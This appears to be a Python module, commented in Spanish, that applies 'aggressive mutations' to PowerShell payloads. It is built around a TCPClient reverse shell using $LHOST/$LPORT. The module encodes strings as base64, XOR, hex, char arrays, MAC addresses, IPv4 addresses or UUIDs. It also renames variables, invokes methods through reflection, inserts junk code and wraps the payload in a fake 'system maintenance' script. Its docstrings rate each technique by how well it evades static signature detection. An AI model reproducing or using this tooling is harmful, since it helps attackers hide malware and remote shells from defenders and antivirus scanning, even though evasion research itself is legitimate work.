import base64
import hashlib
import random
import re
import time
import logging

logger = logging.getLogger(__name__)


def apply_aggressive_mutation(payload, action, mutation_id):
    """
    Aplica mutaciones agresivas que realmente cambian el código del payload.
    
    Args:
        payload: String con el payload de PowerShell a mutar
        action: Nombre de la acción de mutación a aplicar
        mutation_id: Identificador único para esta mutación
        
    Returns:
        String con el payload mutado
        
    Raises:
        No lanza excepciones, siempre retorna un payload (puede ser el original si falla)
    """

    logger.debug(f"Aplicando mutación: {action} (ID: {mutation_id})")
    print(f"      [+] Aplicando mutación: {action}")
    
    # Guardar hash original para validación posterior
    original_hash = hashlib.md5(payload.encode()).hexdigest()

    if action == 'encode_all_strings_base64':
        """
        Codifica todos los strings literales usando métodos variados y menos detectables.
        Efectividad: Alta - Ofusca strings detectables por firmas estáticas.
        """
        # Codificar TODOS los strings usando métodos variados
        # Solo buscar strings literales simples (no dentro de código generado)
        # Buscar strings que NO estén dentro de expresiones complejas
        strings = re.findall(r'"[^"]*"', payload)
        
        for string in strings:
            # Verificar que el string no esté dentro de código generado
            string_pos = payload.find(string)
            if string_pos == -1:
                continue
            
            # Verificar contexto: no debe estar dentro de expresiones complejas
            before = payload[max(0, string_pos - 50):string_pos]
            after = payload[string_pos + len(string):min(len(payload), string_pos + len(string) + 50)]
            
            # Saltar si está dentro de código generado
            if ('$b64_' in before or '$mac_' in before or '$ip_' in before or '$uuid_' in before or
                '$key_' in before or '$enc_' in before or '$dec_' in before or
                'char[]' in before or 'FromBase64String' in before or
                'GetString' in before or 'GetEncoding' in before):
                continue
            
            if string and len(string) > 2:
                original_str = string[1:-1]
                encoded = base64.b64encode(original_str.encode()).decode()
                
                # Elegir método aleatorio para variar
                method_num = random.randint(1, 5)  # Reducido a 5 métodos más seguros
                
                if method_num == 1:
                    # Método 1: Base64 directo con encoding alternativo
                    replacement = f'([System.Text.Encoding]::GetEncoding(65001).GetString([System.Convert]::FromBase64String("{encoded}")]))'
                elif method_num == 2:
                    # Método 2: Base64 con variable intermedia - solo si NO está dentro de una expresión
                    string_pos = payload.find(string)
                    if string_pos != -1:
                        before = payload[max(0, string_pos - 50):string_pos]
                        # Verificar si está dentro de una llamada a función (paréntesis abierto sin cerrar)
                        open_parens = before.count('(') - before.count(')')
                        # Si hay paréntesis abiertos sin cerrar, está dentro de una expresión
                        if open_parens > 0:
                            # Usar método simple sin variable intermedia
                            replacement = f'([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded}")))'
                            payload = payload.replace(string, replacement, 1)
                            continue
                        
                        # Si no está dentro de expresión, usar variable intermedia
                        var_id = random.randint(1000, 9999)
                        line_start = payload.rfind('\n', 0, string_pos) + 1
                        # Insertar variable antes de la línea
                        payload = payload[:line_start] + f'$b64_{var_id} = "{encoded}";\n' + payload[line_start:]
                        # Ajustar posición después de inserción
                        string_pos = payload.find(string, line_start + len(f'$b64_{var_id} = "{encoded}";\n'))
                        if string_pos != -1:
                            replacement = f'([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_{var_id})))'
                            payload = payload[:string_pos] + replacement + payload[string_pos + len(string):]
                            continue
                elif method_num == 3:
                    # Método 3: Usando método de instancia
                    replacement = f'(([System.Text.Encoding]::UTF8).GetString([System.Convert]::FromBase64String("{encoded}")))'
                elif method_num == 4:
                    # Método 4: Con substring para evitar detección
                    replacement = f'(([System.Text.Encoding]::UTF8).GetString([System.Convert]::FromBase64String(("{encoded}").Substring(0))))'
                else:
                    # Método 5: Encoding alternativo
                    replacement = f'([System.Text.Encoding]::GetEncoding("utf-8").GetString([System.Convert]::FromBase64String("{encoded}")))'
                
                try:
                    payload = payload.replace(string, replacement, 1)  # Solo reemplazar primera ocurrencia
                except Exception as e:
                    logger.warning(f"Error al aplicar encoding method {method_num}: {e}")
                    # Fallback a método simple
                    payload = payload.replace(string, f'([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded}")))', 1)

    elif action == 'split_commands_aggressive':
        """
        Divide comandos separados por punto y coma y líneas largas en múltiples líneas.
        Efectividad: Media - Cambia estructura pero mantiene funcionalidad.
        """
        # Dividir comandos de forma agresiva
        if ';' in payload:
            lines = payload.split(';')
            new_lines = []
            for line in lines:
                if line.strip():
                    new_lines.append(line.strip())
            payload = '\n'.join(new_lines)

        # Dividir líneas largas
        lines = payload.split('\n')
        new_lines = []
        for line in lines:
            if len(line) > 80 and '=' in line:
                parts = line.split('=')
                if len(parts) == 2:
                    new_lines.append(f"{parts[0].strip()} =")
                    new_lines.append(f"    {parts[1].strip()}")
                else:
                    new_lines.append(line)
            else:
                new_lines.append(line)
        payload = '\n'.join(new_lines)

    elif action == 'rename_all_variables':
        """
        Renombra todas las variables usando esquemas variados y menos predecibles.
        Efectividad: Alta - Rompe firmas basadas en nombres de variables conocidos.
        """
        # Renombrar TODAS las variables con esquemas variados
        variables = re.findall(r'\$[A-Za-z_][A-Za-z0-9_]*', payload)
        unique_vars = list(set(variables))
        
        # Esquemas de nombres variados
        naming_schemes = [
            lambda v, mid: f"$_{hashlib.sha256((v + mid).encode()).hexdigest()[:12]}",
            lambda v, mid: f"$v{random.randint(100000,999999)}{hashlib.md5(v.encode()).hexdigest()[:4]}",
            lambda v, mid: f"$x{''.join(random.choices('abcdef0123456789', k=8))}",
            lambda v, mid: f"$tmp_{random.randint(1000,9999)}_{hashlib.md5(v.encode()).hexdigest()[:6]}",
            lambda v, mid: f"$r{random.randint(10000,99999)}",
        ]

        for var in unique_vars:
            if var not in ['$null', '$true', '$false', '$_', '$args', '$error', '$input']:
                # Elegir esquema aleatorio
                scheme = random.choice(naming_schemes)
                new_name = scheme(var, mutation_id)
                # Reemplazar todas las ocurrencias
                payload = payload.replace(var, new_name)

    elif action == 'add_multiple_benign_wrappers':
        """
        Envuelve el payload con código benigno que simula script de mantenimiento.
        Efectividad: Media - Puede confundir análisis estáticos.
        """
        # Añadir múltiples wrappers benignos
        wrapper = f'''
# =============================================================================
# SYSTEM MAINTENANCE SCRIPT - Build {random.randint(1000, 9999)}
# Purpose: Automated system optimization and monitoring
# Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
# =============================================================================

function Start-SystemCheck{random.randint(100, 999)} {{
    try {{
        # Check system resources
        $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
        $memory = Get-WmiObject -Class Win32_ComputerSystem
        Write-Debug "System check completed" -Debug
    }} catch {{
        # Silent error handling
    }}
}}

# Initialize system monitoring
Start-SystemCheck{random.randint(100, 999)}

'''
        payload = wrapper + payload + f'''

# =============================================================================
# SCRIPT EXECUTION COMPLETED
# Cleanup temporary resources
# =============================================================================

Remove-Variable * -ErrorAction SilentlyContinue
[System.GC]::Collect()
'''

    elif action == 'change_entire_syntax':
        """
        Reemplaza nombres de métodos y propiedades con variantes personalizadas.
        Efectividad: Baja - Puede romper funcionalidad si no se maneja correctamente.
        """
        # Cambiar sintaxis completamente
        replacements = [
            ('New-Object', 'NewObject'),
            ('GetStream()', 'GetStreamMethod()'),
            ('StreamReader', 'StreamReaderClass'),
            ('StreamWriter', 'StreamWriterClass'),
            ('TCPClient', 'TCPClientClass'),
            ('DataAvailable', 'DataAvailableProperty'),
            ('AutoFlush', 'AutoFlushProperty'),
            ('Connected', 'ConnectedProperty')
        ]

        for old, new in replacements:
            payload = payload.replace(old, new)

    elif action == 'insert_random_whitespace':
        """
        Añade espacios aleatorios al inicio de líneas y líneas vacías.
        Efectividad: Muy Baja - Solo cambia formato, no afecta detección.
        """
        # Insertar espacios en blanco aleatorios
        lines = payload.split('\n')
        new_lines = []
        for line in lines:
            # Añadir espacios aleatorios al inicio
            spaces = ' ' * random.randint(0, 8)
            new_lines.append(spaces + line)

            # Añadir líneas vacías aleatorias
            if random.random() > 0.7:
                new_lines.append('')

        payload = '\n'.join(new_lines)

    elif action == 'obfuscate_network_calls':
        """
        Reemplaza creación directa de TCPClient con reflexión.
        Efectividad: Alta - Ofusca llamadas de red comúnmente detectadas.
        """
        # Ofuscar llamadas de red específicamente para tu payload
        if 'TCPClient' in payload:
            # Reemplazar TCPClient con creación más compleja
            payload = payload.replace(
                'New-Object Net.Sockets.TCPClient($LHOST, $LPORT)',
                f'''$tcpType = [System.Net.Sockets.TCPClient]
$tcpConstructor = $tcpType.GetConstructor(@([string], [int]))
$TCPClient = $tcpConstructor.Invoke(@($LHOST, $LPORT))'''
            )

    elif action == 'use_reflection_methods':
        """
        Reemplaza llamadas directas a métodos con invocación usando reflexión.
        Efectividad: Alta - Ofusca llamadas a métodos detectables.
        """
        # Usar reflexión para métodos comunes
        reflection_replacements = [
            ('GetStream()', '.GetType().GetMethod("GetStream").Invoke($TCPClient, @())'),
            ('Read(', '.GetType().GetMethod("Read").Invoke($NetworkStream, @($Buffer, 0, $Buffer.Length))'),
            ('Write(', '.GetType().GetMethod("Write").Invoke($StreamWriter, @("$Output`n"))'),
            ('Close()', '.GetType().GetMethod("Close").Invoke($TCPClient, @())')
        ]

        for old, new in reflection_replacements:
            if old in payload:
                payload = payload.replace(old, new)

    elif action == 'add_fake_error_handling':
        """
        Añade bloques try-catch falsos alrededor de líneas aleatorias.
        Efectividad: Baja - Añade ruido sin mejorar evasión significativamente.
        """
        # Añadir manejo de errores falso por todas partes
        lines = payload.split('\n')
        new_lines = []

        for line in lines:
            new_lines.append(line)
            if random.random() > 0.6 and line.strip() and not line.strip().startswith('#'):
                error_handler = f'''try {{
    # Temporary operation
    $temp = Get-Date
}} catch [System.Exception] {{
    # Suppress all errors
}}'''
                new_lines.append(error_handler)

        payload = '\n'.join(new_lines)

    elif action == 'modify_encoding_methods':
        """
        Cambia métodos de encoding de UTF8 a codificación por número de página.
        Efectividad: Media - Cambia sintaxis pero mantiene funcionalidad.
        """
        # Modificar métodos de encoding con variaciones
        encoding_replacements = [
            ('([text.encoding]::UTF8).GetString', '[System.Text.Encoding]::GetEncoding(65001).GetString'),
            ('[text.encoding]::UTF8', '[System.Text.Encoding]::GetEncoding("utf-8")'),
            ('[text.encoding]::ASCII', '[System.Text.Encoding]::GetEncoding(20127)'),
            ('System.Text.ASCIIEncoding', 'System.Text.Encoding]::GetEncoding(20127)'),
        ]
        
        for old, new in encoding_replacements:
            if old in payload:
                payload = payload.replace(old, new)

    elif action == 'use_hex_encoding':
        """
        Codifica strings usando hexadecimal (menos común que Base64, más difícil de detectar).
        Efectividad: Alta - Técnica simple pero efectiva, no rompe ejecución.
        """
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            if string and len(string) > 2:
                original_str = string[1:-1]
                # Convertir a bytes y luego a hex
                hex_bytes = original_str.encode('utf-8').hex()
                # Crear array de bytes desde hex
                hex_pairs = [f'0x{hex_bytes[i:i+2]}' for i in range(0, len(hex_bytes), 2)]
                hex_array = ','.join(hex_pairs)
                replacement = f'[System.Text.Encoding]::UTF8.GetString([byte[]]({hex_array}))'
                payload = payload.replace(string, replacement, 1)

    elif action == 'use_char_array_encoding':
        """
        Codifica strings usando arrays de caracteres (muy difícil de detectar).
        Efectividad: Alta - Técnica poco común, funciona perfectamente.
        """
        # Solo buscar strings literales simples (no dentro de código generado)
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            # Verificar que el string no esté dentro de código generado
            string_pos = payload.find(string)
            if string_pos == -1:
                continue
            
            # Verificar contexto: no debe estar dentro de expresiones complejas
            before = payload[max(0, string_pos - 50):string_pos]
            
            # Saltar si está dentro de código generado
            if ('$b64_' in before or '$mac_' in before or '$ip_' in before or '$uuid_' in before or
                '$key_' in before or '$enc_' in before or '$dec_' in before or
                'char[]' in before or 'FromBase64String' in before or
                'GetString' in before or 'GetEncoding' in before):
                continue
            
            if string and len(string) > 2:
                original_str = string[1:-1]
                # Convertir a códigos ASCII
                char_codes = [str(ord(c)) for c in original_str]
                char_array = ','.join(char_codes)
                replacement = f'([char[]]({char_array}) -join \'\')'
                payload = payload.replace(string, replacement, 1)

    elif action == 'split_strings_chunks':
        """
        Divide strings largos en chunks y los concatena en tiempo de ejecución.
        Efectividad: Alta - Evita detección de strings completos.
        """
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            if string and len(string) > 10:
                original_str = string[1:-1]
                # Dividir en chunks de 3-5 caracteres
                chunk_size = random.randint(3, 5)
                chunks = [original_str[i:i+chunk_size] for i in range(0, len(original_str), chunk_size)]
                if len(chunks) > 1:
                    # Codificar cada chunk en Base64
                    encoded_chunks = [base64.b64encode(chunk.encode()).decode() for chunk in chunks]
                    # Crear variables con nombres consistentes
                    base_id = random.randint(1000, 9999)
                    chunk_vars = []
                    var_names = []
                    for i, enc_chunk in enumerate(encoded_chunks):
                        var_name = f'$chunk_{base_id}_{i}'
                        var_names.append(var_name)
                        chunk_vars.append(f'{var_name} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{enc_chunk}"));')
                    replacement = '(' + ' + '.join(var_names) + ')'
                    # Insertar variables antes del uso
                    payload = payload.replace(string, '\n'.join(chunk_vars) + '\n' + replacement, 1)

    elif action == 'add_junk_code':
        """
        Añade código basura que parece legítimo pero no afecta la ejecución.
        Efectividad: Media - Confunde análisis estático.
        """
        junk_snippets = [
            '$junk1 = Get-Date; $junk2 = $junk1.ToString();',
            '$temp = [System.Environment]::GetEnvironmentVariable("TEMP");',
            '$null = [System.GC]::Collect();',
            '$dummy = 1 + 1; $dummy = $dummy * 2;',
            '$check = Test-Path $env:TEMP; if($check) { $null = $check }',
        ]
        
        lines = payload.split('\n')
        if len(lines) > 1:
            # Insertar código basura aleatoriamente
            for _ in range(random.randint(2, 4)):
                insert_pos = random.randint(0, len(lines) - 1)
                junk = random.choice(junk_snippets)
                lines.insert(insert_pos, junk)
            payload = '\n'.join(lines)

    elif action == 'obfuscate_with_xor':
        """
        Ofusca strings usando XOR (más difícil de detectar que Base64).
        Efectividad: Alta - Técnica menos común.
        """
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            # Verificar que el string no esté dentro de código generado
            string_pos = payload.find(string)
            if string_pos == -1:
                continue
            
            # Verificar contexto: no debe estar dentro de expresiones complejas
            before = payload[max(0, string_pos - 50):string_pos]
            
            # Saltar si está dentro de código generado
            if ('$b64_' in before or '$mac_' in before or '$ip_' in before or '$uuid_' in before or
                '$key_' in before or '$enc_' in before or '$dec_' in before or
                'char[]' in before or 'FromBase64String' in before or
                'GetString' in before or 'GetEncoding' in before):
                continue
            
            if string and len(string) > 3:
                original_str = string[1:-1]
                # Generar clave XOR aleatoria
                xor_key = random.randint(1, 255)
                # Aplicar XOR byte a byte
                xor_bytes = bytes([ord(c) ^ xor_key for c in original_str])
                encoded = base64.b64encode(xor_bytes).decode()
                # Decodificar con XOR usando PowerShell - usar paréntesis para agrupar
                var_id = random.randint(1000, 9999)
                replacement = f'([System.Text.Encoding]::UTF8.GetString(([byte[]]([System.Convert]::FromBase64String("{encoded}") | ForEach-Object {{ $_ -bxor {xor_key} }}))))'
                payload = payload.replace(string, replacement, 1)

    elif action == 'use_environment_variables':
        """
        Usa variables de entorno para ofuscar valores hardcodeados.
        Efectividad: Media - Cambia patrones detectables.
        """
        # Reemplazar IPs y puertos con variables de entorno
        ip_pattern = r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b'
        port_pattern = r'(\d{4,5})'
        
        def replace_ip(match):
            ip = match.group(1)
            # Codificar IP en Base64 y usar variable de entorno
            encoded = base64.b64encode(ip.encode()).decode()
            return f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded}"))'
        
        payload = re.sub(ip_pattern, replace_ip, payload)
        
        # Para puertos, usar variables calculadas
        def replace_port(match):
            port = match.group(1)
            # Usar cálculo para ocultar puerto
            a = random.randint(1, int(port) - 1)
            b = int(port) - a
            return f'({a} + {b})'
        
        payload = re.sub(port_pattern, replace_port, payload)

    elif action == 'use_cmdlet_aliases':
        """
        Reemplaza cmdlets conocidos con alias o métodos alternativos.
        Efectividad: Media-Alta - Evita detección de cmdlets maliciosos.
        """
        # Reemplazos simples de cmdlets
        if 'New-Object' in payload and random.random() > 0.5:
            # Reemplazar algunas instancias de New-Object con alternativas
            payload = payload.replace('New-Object', 'NewObject', 1)
        
        if 'iex ' in payload:
            payload = payload.replace('iex ', 'Invoke-Expression ', 1)
        elif 'Invoke-Expression' in payload:
            payload = payload.replace('Invoke-Expression', 'iex', 1)
        
        if 'Out-String' in payload:
            payload = payload.replace('Out-String', 'OutString', 1)
        
        # Reemplazar GetStream con reflexión (solo si no está ya usando reflexión)
        if '.GetStream()' in payload and '.GetType().GetMethod' not in payload:
            payload = payload.replace('.GetStream()', '.GetType().GetMethod("GetStream").Invoke($_, @())', 1)

    elif action == 'use_mac_address_encoding':
        """
        Codifica strings como direcciones MAC (formato XX-XX-XX-XX-XX-XX).
        Efectividad: Muy Alta - Parece dirección MAC legítima, muy difícil de detectar.
        """
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            # Verificar que el string no esté dentro de código generado
            string_pos = payload.find(string)
            if string_pos == -1:
                continue
            
            # Verificar contexto: no debe estar dentro de expresiones complejas
            before = payload[max(0, string_pos - 50):string_pos]
            
            # Saltar si está dentro de código generado
            if ('$b64_' in before or '$mac_' in before or '$ip_' in before or '$uuid_' in before or
                '$key_' in before or '$enc_' in before or '$dec_' in before or
                'char[]' in before or 'FromBase64String' in before or
                'GetString' in before or 'GetEncoding' in before):
                continue
            
            if string and len(string) > 2:
                try:
                    original_str = string[1:-1]
                    bytes_data = original_str.encode('utf-8')
                    
                    # Dividir en chunks de 6 bytes (tamaño MAC)
                    mac_chunks = []
                    for i in range(0, len(bytes_data), 6):
                        chunk = bytes_data[i:i+6]
                        # Convertir a formato MAC: XX-XX-XX-XX-XX-XX
                        mac_str = '-'.join([f'{b:02x}' for b in chunk])
                        mac_chunks.append(mac_str)
                    
                    if mac_chunks:
                        # Decodificar: convertir MACs a bytes y luego a string
                        var_id = random.randint(1000, 9999)
                        mac_vars = []
                        for i, mac in enumerate(mac_chunks):
                            var_name = f'$mac_{var_id}_{i}'
                            mac_vars.append(f'{var_name} = "{mac}";')
                        
                        # Decodificación: convertir cada MAC a bytes
                        decode_parts = []
                        for i in range(len(mac_chunks)):
                            decode_parts.append(f'[byte[]](($mac_{var_id}_{i} -split \'-\' | ForEach-Object {{ [Convert]::ToByte($_, 16) }}))')
                        
                        # Concatenar todos los chunks - usar expresión completa entre paréntesis
                        if len(decode_parts) == 1:
                            replacement = f'([System.Text.Encoding]::UTF8.GetString({decode_parts[0]}))'
                        else:
                            # Para múltiples chunks, crear una expresión completa
                            replacement = f'([System.Text.Encoding]::UTF8.GetString([byte[]](({(" + ").join(decode_parts)}))))'
                        
                        # Insertar variables antes del string original
                        string_pos = payload.find(string)
                        if string_pos != -1:
                            # Verificar si está dentro de una expresión (paréntesis abierto)
                            before = payload[max(0, string_pos - 50):string_pos]
                            open_parens = before.count('(') - before.count(')')
                            
                            if open_parens > 0:
                                # Está dentro de una expresión, usar método simple sin variables
                                replacement = f'([System.Text.Encoding]::UTF8.GetString([byte[]](({(" + ").join(decode_parts)}))))'
                                payload = payload.replace(string, replacement, 1)
                            else:
                                # No está dentro de expresión, insertar variables
                                line_start = payload.rfind('\n', 0, string_pos) + 1
                                # Insertar variables antes de esa línea
                                payload = payload[:line_start] + '\n'.join(mac_vars) + '\n' + payload[line_start:]
                                # Ajustar posición del string después de la inserción
                                string_pos = payload.find(string, line_start + len('\n'.join(mac_vars)) + 1)
                                if string_pos != -1:
                                    payload = payload[:string_pos] + replacement + payload[string_pos + len(string):]
                        else:
                            payload = payload.replace(string, replacement, 1)
                except Exception as e:
                    logger.warning(f"Error en MAC encoding: {e}")
                    pass

    elif action == 'use_ipv4_encoding':
        """
        Codifica strings como direcciones IPv4 (formato XXX.XXX.XXX.XXX).
        Efectividad: Muy Alta - Parece IP legítima, extremadamente difícil de detectar.
        """
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            # Verificar que el string no esté dentro de código generado
            string_pos = payload.find(string)
            if string_pos == -1:
                continue
            
            # Verificar contexto: no debe estar dentro de expresiones complejas
            before = payload[max(0, string_pos - 50):string_pos]
            
            # Saltar si está dentro de código generado
            if ('$b64_' in before or '$mac_' in before or '$ip_' in before or '$uuid_' in before or
                '$key_' in before or '$enc_' in before or '$dec_' in before or
                'char[]' in before or 'FromBase64String' in before or
                'GetString' in before or 'GetEncoding' in before):
                continue
            
            if string and len(string) > 2:
                try:
                    original_str = string[1:-1]
                    bytes_data = original_str.encode('utf-8')
                    
                    # Dividir en chunks de 4 bytes (tamaño IP)
                    ip_chunks = []
                    for i in range(0, len(bytes_data), 4):
                        chunk = bytes_data[i:i+4]
                        # Convertir a formato IP: XXX.XXX.XXX.XXX
                        ip_str = '.'.join([str(b) for b in chunk])
                        ip_chunks.append(ip_str)
                    
                    if ip_chunks:
                        # Decodificar: convertir IPs a bytes y luego a string
                        var_id = random.randint(1000, 9999)
                        ip_vars = []
                        for i, ip in enumerate(ip_chunks):
                            var_name = f'$ip_{var_id}_{i}'
                            ip_vars.append(f'{var_name} = "{ip}";')
                        
                        # Decodificación: convertir cada IP a bytes
                        decode_parts = []
                        for i in range(len(ip_chunks)):
                            decode_parts.append(f'[byte[]](($ip_{var_id}_{i} -split \'\.\' | ForEach-Object {{ [int]$_ }}))')
                        
                        # Concatenar todos los chunks - usar expresión completa entre paréntesis
                        if len(decode_parts) == 1:
                            replacement = f'([System.Text.Encoding]::UTF8.GetString({decode_parts[0]}))'
                        else:
                            # Para múltiples chunks, crear una expresión completa
                            replacement = f'([System.Text.Encoding]::UTF8.GetString([byte[]](({(" + ").join(decode_parts)}))))'
                        
                        # Insertar variables antes del string original
                        string_pos = payload.find(string)
                        if string_pos != -1:
                            # Verificar si está dentro de una expresión (paréntesis abierto)
                            before = payload[max(0, string_pos - 50):string_pos]
                            open_parens = before.count('(') - before.count(')')
                            
                            if open_parens > 0:
                                # Está dentro de una expresión, usar método simple sin variables
                                replacement = f'([System.Text.Encoding]::UTF8.GetString([byte[]](({(" + ").join(decode_parts)}))))'
                                payload = payload.replace(string, replacement, 1)
                            else:
                                # No está dentro de expresión, insertar variables
                                line_start = payload.rfind('\n', 0, string_pos) + 1
                                # Insertar variables antes de esa línea
                                payload = payload[:line_start] + '\n'.join(ip_vars) + '\n' + payload[line_start:]
                                # Ajustar posición del string después de la inserción
                                string_pos = payload.find(string, line_start + len('\n'.join(ip_vars)) + 1)
                                if string_pos != -1:
                                    payload = payload[:string_pos] + replacement + payload[string_pos + len(string):]
                        else:
                            payload = payload.replace(string, replacement, 1)
                except Exception as e:
                    logger.warning(f"Error en IPv4 encoding: {e}")
                    pass

    elif action == 'use_uuid_encoding':
        """
        Codifica strings como UUIDs (formato XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX).
        Efectividad: Muy Alta - Parece UUID legítimo, muy difícil de detectar.
        """
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            # Verificar que el string no esté dentro de código generado
            string_pos = payload.find(string)
            if string_pos == -1:
                continue
            
            # Verificar contexto: no debe estar dentro de expresiones complejas
            before = payload[max(0, string_pos - 50):string_pos]
            
            # Saltar si está dentro de código generado
            if ('$b64_' in before or '$mac_' in before or '$ip_' in before or '$uuid_' in before or
                '$key_' in before or '$enc_' in before or '$dec_' in before or
                'char[]' in before or 'FromBase64String' in before or
                'GetString' in before or 'GetEncoding' in before):
                continue
            
            if string and len(string) > 4:
                try:
                    original_str = string[1:-1]
                    bytes_data = original_str.encode('utf-8')
                    
                    # Dividir en chunks de 16 bytes (tamaño UUID)
                    uuid_chunks = []
                    for i in range(0, len(bytes_data), 16):
                        chunk = bytes_data[i:i+16]
                        # Rellenar con ceros si es necesario
                        if len(chunk) < 16:
                            chunk = chunk + bytes([0] * (16 - len(chunk)))
                        # Convertir a formato UUID: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
                        uuid_hex = ''.join([f'{b:02x}' for b in chunk])
                        uuid_str = f'{uuid_hex[0:8]}-{uuid_hex[8:12]}-{uuid_hex[12:16]}-{uuid_hex[16:20]}-{uuid_hex[20:32]}'
                        uuid_chunks.append((uuid_str, len(bytes_data[i:i+16])))  # Guardar longitud real
                    
                    if uuid_chunks:
                        # Decodificar: convertir UUIDs a bytes y luego a string
                        var_id = random.randint(1000, 9999)
                        uuid_vars = []
                        for i, (uuid, real_len) in enumerate(uuid_chunks):
                            var_name = f'$uuid_{var_id}_{i}'
                            uuid_vars.append(f'{var_name} = "{uuid}";')
                        
                        # Decodificación: convertir cada UUID a bytes
                        decode_parts = []
                        for i, (uuid, real_len) in enumerate(uuid_chunks):
                            hex_str = uuid.replace('-', '')
                            # Convertir hex string a bytes usando PowerShell
                            # Dividir en pares de hex y convertir a bytes (solo los bytes reales)
                            hex_pairs = []
                            for j in range(0, min(len(hex_str), real_len * 2), 2):
                                if j + 1 < len(hex_str):
                                    hex_pairs.append(f'0x{hex_str[j:j+2]}')
                            hex_array = ','.join(hex_pairs)
                            decode_parts.append(f'[byte[]]({hex_array})')
                        
                        # Concatenar todos los chunks - usar expresión completa entre paréntesis
                        if len(decode_parts) == 1:
                            replacement = f'([System.Text.Encoding]::UTF8.GetString({decode_parts[0]}))'
                        else:
                            # Para múltiples chunks, crear una expresión completa
                            replacement = f'([System.Text.Encoding]::UTF8.GetString([byte[]](({(" + ").join(decode_parts)}))))'
                        
                        # Insertar variables antes del string original
                        string_pos = payload.find(string)
                        if string_pos != -1:
                            # Verificar si está dentro de una expresión (paréntesis abierto)
                            before = payload[max(0, string_pos - 50):string_pos]
                            open_parens = before.count('(') - before.count(')')
                            
                            if open_parens > 0:
                                # Está dentro de una expresión, usar método simple sin variables
                                replacement = f'([System.Text.Encoding]::UTF8.GetString([byte[]](({(" + ").join(decode_parts)}))))'
                                payload = payload.replace(string, replacement, 1)
                            else:
                                # No está dentro de expresión, insertar variables
                                line_start = payload.rfind('\n', 0, string_pos) + 1
                                # Insertar variables antes de esa línea
                                payload = payload[:line_start] + '\n'.join(uuid_vars) + '\n' + payload[line_start:]
                                # Ajustar posición del string después de la inserción
                                string_pos = payload.find(string, line_start + len('\n'.join(uuid_vars)) + 1)
                                if string_pos != -1:
                                    payload = payload[:string_pos] + replacement + payload[string_pos + len(string):]
                        else:
                            payload = payload.replace(string, replacement, 1)
                except Exception as e:
                    logger.warning(f"Error en UUID encoding: {e}")
                    pass

    # Verificar que el payload realmente cambió
    mutated_hash = hashlib.md5(payload.encode()).hexdigest()
    if original_hash == mutated_hash:
        logger.warning(f"Mutación {action} no cambió el payload, aplicando fallback")
        print("      [+] Mutación no aplicada, usando fallback...")
        # Fallback más agresivo: añadir comentarios y espacios
        lines = payload.split('\n')
        if len(lines) > 0:
            # Añadir comentario al inicio
            lines.insert(0, f'# Mutation: {action} - ID: {mutation_id} - {time.strftime("%Y%m%d_%H%M%S")}')
            # Añadir comentario al final
            lines.append(f'# End mutation: {action}')
            # Añadir línea vacía aleatoria
            if len(lines) > 2:
                insert_pos = random.randint(1, len(lines) - 2)
                lines.insert(insert_pos, '')
            payload = '\n'.join(lines)
            
            # Verificar que el fallback realmente cambió el payload
            final_hash = hashlib.md5(payload.encode()).hexdigest()
            if final_hash == original_hash:
                # Último recurso: añadir caracteres invisibles
                payload = f'# {mutation_id}\n{payload}\n# {hashlib.md5(mutation_id.encode()).hexdigest()[:8]}'
                logger.warning(f"Fallback básico falló, usando fallback de emergencia para {action}")
    else:
        logger.debug(f"Mutación {action} aplicada exitosamente (hash cambió)")

    return payload


def analyze_payload_detailed(payload):
    """
    Análisis detallado del payload.
    
    Extrae features estructurales del payload para análisis y representación de estados.
    
    Returns:
        Diccionario con:
        - original: payload original
        - length: longitud del payload
        - lines: número de líneas
        - has_semicolons: si contiene punto y coma
        - has_newlines: si contiene saltos de línea
        - variables: lista de variables únicas encontradas
        - methods: lista de métodos únicos encontrados
        - objects: lista de objetos únicos creados con New-Object
        - strings: lista de strings encontrados
        - ip_addresses: direcciones IP encontradas
        - ports: puertos encontrados
        - hash: hash MD5 del payload (primeros 16 caracteres)
    """
    structure = {
        'original': payload,
        'length': len(payload),
        'lines': payload.count('\n') + 1,
        'has_semicolons': ';' in payload,
        'has_newlines': '\n' in payload,
        'variables': list(set(re.findall(r'\$[A-Za-z_][A-Za-z0-9_]*', payload))),
        'methods': list(set(re.findall(r'\.\w+\(', payload))),
        'objects': list(set(re.findall(r'New-Object\s+([^\s\(]+)', payload))),
        'strings': re.findall(r'"[^"]*"', payload),
        'ip_addresses': re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', payload),
        'ports': re.findall(r'LPORT\s*=\s*(\d+)', payload)
    }

    # Calcular hash
    structure['hash'] = hashlib.md5(payload.encode()).hexdigest()[:16]

    return structure


def validate_mutation_applied(original_payload, mutated_payload):
    """
    Valida que la mutación se haya aplicado realmente comparando hashes y contenido.
    
    Args:
        original_payload: Payload original antes de la mutación
        mutated_payload: Payload después de aplicar la mutación
        
    Returns:
        Tupla (bool, str): 
        - True si la mutación se aplicó, False en caso contrario
        - Mensaje descriptivo del resultado
    """
    original_hash = hashlib.md5(original_payload.encode()).hexdigest()
    mutated_hash = hashlib.md5(mutated_payload.encode()).hexdigest()

    if original_hash == mutated_hash:
        return False, "No changes detected"

    # Verificar cambios visuales
    original_lines = original_payload.split('\n')
    mutated_lines = mutated_payload.split('\n')

    if len(original_lines) == len(mutated_lines) and original_payload == mutated_payload:
        return False, "Identical content"

    return True, f"Mutation applied: {len(original_lines)} -> {len(mutated_lines)} lines, hash changed"
